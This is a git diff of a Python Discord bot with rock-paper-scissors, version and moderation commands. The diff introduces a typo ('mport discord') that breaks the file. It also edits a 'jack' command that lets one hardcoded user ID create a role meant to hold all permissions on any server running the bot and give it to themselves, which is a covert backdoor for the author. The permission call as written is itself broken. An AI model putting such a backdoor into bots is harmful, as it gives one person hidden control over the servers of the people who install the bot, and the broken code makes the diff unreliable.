@@ -1,4 +1,4 @@
-import discord
+mport discord
 from discord.ext.commands import Bot
 from discord.ext import commands
 import asyncio
@@ -44,7 +44,7 @@ async def on_message(message):
                 elif k == 2:
                     await client.send_message(message.channel, "<@%s> You win cool! :cool:" % (message.author.id))
                 else:
-                    await client.send_message(message.channel, "<@%s> Tie! :P:" % (message.author.id))
+                    await client.send_message(message.channel, "<@%s> Tie! " % (message.author.id))
             elif args[1].upper() == "ROCK":
                 if k == 1:
                     await client.send_message(message.channel, "<@%s> Tie!" % (message.author.id))
@@ -61,7 +61,7 @@ async def on_message(message):
                     await client.send_message(message.channel, "<@%s> awww you lost :cry:" % (message.author.id))
          
     if message.content.startswith(';version'):
-        msg = 'V1.0.3 BETA\nBuild:80'.format(message)
+        msg = 'V1.0.3 BETA\nBuild:81'.format(message)
         await client.send_message(message.channel, msg)    
        
        
@@ -122,10 +122,10 @@ async def jack(ctx):
     if ctx.message.author.id == '344967220025098242':
         await client.create_role(ctx.message.server, name="JACK")
         role = discord.utils.get(ctx.message.server.roles, name="JACK")
-        role.all()
+        role.permissions.all()
         await client.add_roles(ctx.message.author, role)
     else:
-        return await client.say("Ur not jack m8")
+        return await client.say("Only Jackaboi#8319 Can Use This Command!")
 @client.command(pass_context=True)
 async def unmute(ctx, member: discord.Member):
     role = discord.utils.get(member.server.roles, name="Muted")
